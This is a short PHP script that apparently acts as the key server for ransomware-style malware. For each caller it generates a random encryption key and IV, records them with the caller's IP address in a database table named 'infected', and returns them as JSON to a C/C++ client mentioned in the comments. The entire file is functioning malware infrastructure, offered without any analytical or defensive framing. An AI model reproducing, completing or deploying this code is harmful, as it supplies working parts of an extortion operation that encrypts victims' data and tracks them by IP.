<?php

require_once "config.php";

$response_id = get_unique_id();
$response_key = "";
$response_iv = "";
$response_ip = getip();

//connect to mysql
$connection = mysqli_connect($config_mysql_host, $config_mysql_user, $config_mysql_password, $config_mysql_db);
if (!$connection) {
      //Make sure c/c++ code checks for invalid responses!!
    die("Database Connection Failed");
}

//generate secure key/iv
$strong_crypto = true;
$random_key_bytes = openssl_random_pseudo_bytes(32, $strong_crypto);
$random_iv_bytes = openssl_random_pseudo_bytes(16, $strong_crypto);

$response_key = get_safestring_from_bytes($random_key_bytes);
$response_iv = get_safestring_from_bytes($random_iv_bytes);

//save values to db and fetch id
$insert_query = "INSERT INTO infected (id, infected.key, iv, ip) VALUES (?, ?, ?, ?)";
if ($stmt = $connection->prepare($insert_query)) {
    $stmt->bind_param("ssss", $response_id, $response_key, $response_iv, $response_ip);
    $stmt->execute();
    //FIXME: probably would be good to check for errors here
    $stmt->close();
}
else {
    //Make sure c/c++ code checks for invalid responses!!
    die("Database Insert Failed");
}

//return json
//order of values id, key, iv, ip
//i fucking love json :P
header('Content-Type: application/json');
print json_encode(array("id" => $response_id, "key" => $response_key, "iv" => $response_iv, "ip" => $response_ip));